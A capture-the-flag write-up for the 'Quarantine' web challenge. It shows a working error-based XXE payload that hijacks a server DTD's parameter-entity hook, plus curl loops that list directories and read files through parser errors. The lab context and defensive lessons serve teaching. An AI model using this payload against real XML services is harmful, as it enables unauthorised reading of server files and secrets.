---
ctf: "Curtin CTF 2026"
title: "Quarantine"
category: "web"
difficulty: ""
tags: ["xxe", "error-based-xxe", "dtd-injection", "file-read", "directory-listing", "java"]
flag_format: "CURTIN_CTF{...}"
date: "2026-11-21"
---

## Challenge

Rindwell's quarantine desk clears imported cheese. Brokers POST an XML manifest with a mite count and get a receipt back, nothing more. The intake server is locked down tight, no outbound connections. The sealed record is filed somewhere in the vault on it.
curtinmy-quarantine.chals.io

## Approach

**Phase 1 — Analyze**

1. The endpoint `POST /manifest` accepts `application/xml`. A minimal request:
   ```xml
   <manifest><consignment rind="washed"><origin>FR</origin><mites>1</mites></consignment></manifest>
   ```
   returns `RECEIVED: 1 consignment(s) queued for inspection.` — it counts `<consignment>` elements and resolves a DTD, indicating external entities are processed.

2. The server ships a local DTD at `schema/manifest.dtd` (relative to working dir `/opt/quarantine`). That DTD contains a parameter-entity hook:
   ```dtd
   <!ENTITY % broker_extensions "">
   %broker_extensions;
   ```
   This hook is the entire attack surface.

**Phase 2 — Recon / Vulnerability Analysis**

3. **Vulnerability:** XXE (XML External Entity injection). External entity resolution is enabled on attacker-supplied XML.

4. **Constraints that block naive XXE:**
   - No outbound network connections → classic OOB exfiltration (HTTP/FTP callback to attacker server) is dead.
   - Parser forbids parameter-entity references in the internal subset (`PEReferences forbidden in internal subset`) → textbook internal-subset error-based payloads are rejected.

5. **Bypass:** Parameter entities ARE allowed inside an *external* DTD. The server's own `manifest.dtd` runs `%broker_extensions;`, and we can override `broker_extensions` from our document — so the server's local DTD becomes a parameter-entity injection gadget in external-DTD context, bypassing the internal-subset restriction.

**Phase 3 — Infiltrate**

6. **Error-based XXE gadget** (`t.xml`): override `broker_extensions` to define a chain that reads a target file then attempts to open `file:///nonexistent/<file contents>`. The parser fails and echoes the full path (including file contents) in the error response.

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE manifest [
     <!ENTITY % broker_extensions '
       <!ENTITY &#x25; file SYSTEM "file://TARGET">
       <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
       &#x25;eval;
       &#x25;error;
     '>
     <!ENTITY % dtd SYSTEM "file:///proc/self/cwd/schema/manifest.dtd">
     %dtd;
   ]>
   <manifest><consignment rind="washed"><origin>FR</origin><mites>1</mites></consignment></manifest>
   ```

   Driver:
   ```bash
   sed "s#TARGET#/etc/hostname#" t.xml | curl -s -X POST https://curtinmy-quarantine.chals.io/manifest \
     -H 'Content-Type: application/xml' --data-binary @-
   # REJECTED: /nonexistent/<hostname> (No such file or directory)
   ```

   - Reading `/proc/self/cwd/…` confirmed the app working directory is `/opt/quarantine`.
   - A path filter blocks the literal `/proc/.../cwd/` pattern for the *read* target, so for files use real absolute paths like `/opt/quarantine/…`; the DTD load via `/proc/self/cwd/schema/manifest.dtd` is unaffected.

7. **Finding the vault — directory enumeration:** The flag is a "sealed record in the vault" but reading `Server.java` directly fails because Java source contains `'` and `"` characters that terminate the `SYSTEM` literal. Key trick: **Java's `file://` handler returns a newline-separated directory listing when the target is a directory** — filenames contain no quotes, so they leak cleanly.

   ```bash
   for p in /opt/quarantine/ /opt/ / /srv/; do
     echo "=== $p ==="
     sed "s#TARGET#$p#" t.xml | curl -s -X POST https://curtinmy-quarantine.chals.io/manifest \
       -H 'Content-Type: application/xml' --data-binary @-; echo
   done
   ```

   Results:
   - `/opt/quarantine/` → `schema  Server.class  Server.java`
   - `/srv/` → **`vault-2adac148b57a`**
   - `/srv/vault-2adac148b57a/` → **`seal-24c608c8a0.txt`**

8. **Leak the flag:**
   ```bash
   sed "s#TARGET#/srv/vault-2adac148b57a/seal-24c608c8a0.txt#" t.xml | \
     curl -s -X POST https://curtinmy-quarantine.chals.io/manifest \
     -H 'Content-Type: application/xml' --data-binary @-
   # REJECTED: /nonexistent/CURTIN_CTF{redacted} (No such file or directory)
   ```

## Tools

- `curl` — sending XML POST requests
- `sed` — templating TARGET placeholder in `t.xml`
- `t.xml` — error-based XXE gadget using the server's own local DTD as injection point

## Lessons

- **External entity resolution on untrusted XML = XXE.** Disable DTDs entirely (`FEATURE_SECURE_PROCESSING`, `disallow-doctype-decl`, external DTD/entity features off).
- **"No outbound" is not mitigation.** Error-based (in-band) XXE exfiltrates through parser error messages; blocking egress only removes the OOB variant.
- **Don't trust a parser's own local DTD as safe.** A `%broker_extensions;` hook that an attacker can redefine turns the server's DTD into a parameter-entity injection point that sidesteps the "no PEs in internal subset" restriction.
- **`file://` directory listings** are a clean enumeration primitive when source files resist the quote-sensitive error leak — list the filesystem instead of reading code.
- **Randomized vault/record names** are not security through obscurity against directory enumeration.

## Flag

`CURTIN_CTF{redacted}`
